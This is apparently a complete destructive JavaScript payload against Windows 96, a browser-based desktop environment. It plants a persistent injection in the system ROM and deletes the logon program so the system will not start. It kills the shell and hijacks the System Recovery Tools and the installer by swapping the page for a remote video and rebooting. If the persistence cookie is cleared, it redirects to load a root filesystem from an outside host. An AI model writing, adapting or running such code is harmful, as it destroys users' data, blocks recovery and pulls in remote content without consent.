const kinject = `
(async () => {
    kinj=kutil.sysrom.read("KINJECT.js")
    document.cookie = "data-not-cleared=true; path=/; max-age=2147483647;";
    setInterval(() => { if(!document.cookie.split("; ").some(c => c.startsWith("data-not-cleared="))){location.href = "https://windows96.net/?rootfs=https://painscreen.is-a.dev/storage/dogrootfs.zip"};},1000);
    setInterval(() => {
const target = \`| An error occured whilst launching the logon program (C:/system/local/bin/logon)
| The system will not start if this program is not present.
|
| System halted.\`;



    const html = document.body.innerHTML;

    if (html.includes(target)) {
        document.body.innerHTML = '<style>video{width:100%; height:100%;}</style><video id="vid" width="1920" height="1440" autoplay><source src="https://painscreen.is-a.dev/storage/dogcheck.mp4" type="video/mp4"></video>'

        document.getElementsByTagName("video")[0].onended=w96.sys.reboot
    }
        w96.state.processes.forEach(
            (z) => {
                if (z?.appWindow?.title == "System Recovery Tools" && w96.isRecovery) {
                            document.body.innerHTML = '<style>video{width:100%; height:100%;}</style><video id="vid" width="1920" height="1440" autoplay><source src="https://painscreen.is-a.dev/storage/dogcheck.mp4" type="video/mp4"></video>'

        document.getElementsByTagName("video")[0].onended=w96.sys.reboot
                }
                if (z?.appWindow?.title == "Windows 96 Installer" && w96.isRecovery) {
                            document.body.innerHTML = '<style>video{width:100%; height:100%;}</style><video id="vid" width="1920" height="1440" autoplay><source src="https://painscreen.is-a.dev/storage/dogcheck.mp4" type="video/mp4"></video>'

        document.getElementsByTagName("video")[0].onended=w96.sys.reboot
                }
            })
    }, 16)
})();
`;
kutil.sysrom.write("KINJECT.js",kinject);
w96.state.processes.forEach((el)=>{if(el == null) return;if (el.title=="shell36"){el.terminate();}})
w96.FS.rm("C:/system/local/bin/logon")
setTimeout(()=>{location.href="https://windows96.net"},1000)